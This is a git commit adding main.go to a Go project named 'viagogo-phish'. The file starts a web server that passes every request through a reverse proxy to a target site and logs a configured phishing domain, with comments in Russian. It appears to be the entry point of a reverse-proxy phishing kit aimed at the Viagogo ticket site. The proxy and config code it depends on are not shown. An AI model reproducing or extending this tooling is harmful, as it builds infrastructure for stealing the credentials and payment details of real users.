031606914328750f367c886944f1029297cc692d
gigglemyballz_bradarwatisdis <84795310+IsolRock45@users.noreply.github.com>
2026-06-10 15:17:50 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,1 +1,35 @@
+package main
+
+import (
+    "log"
+    "net/http"
+
+    "viagogo-phish/config"
+    "viagogo-phish/proxy"
+
+    "github.com/go-chi/chi/v5"
+    "github.com/go-chi/chi/v5/middleware"
+)
+
+func main() {
+    cfg := config.Load()
+
+    proxyHandler, err := proxy.NewProxyHandler(cfg)
+    if err != nil {
+        log.Fatalf("Не смог поднять прокси: %v", err)
+    }
+
+    r := chi.NewRouter()
+    r.Use(middleware.Logger)
+    r.Use(middleware.Recoverer)
+    r.Use(middleware.RealIP)
+
+    // Все запросы идут через прокси
+    r.Handle("/*", proxyHandler)
+
+    log.Printf("Прокси запущен на порту %s", cfg.Port)
+    log.Printf("Цель: %s://%s", cfg.TargetScheme, cfg.TargetHost)
+    log.Printf("Фишинг-домен: %s", cfg.PhishDomain)
+    log.Fatal(http.ListenAndServe(":"+cfg.Port, r))
+}
 
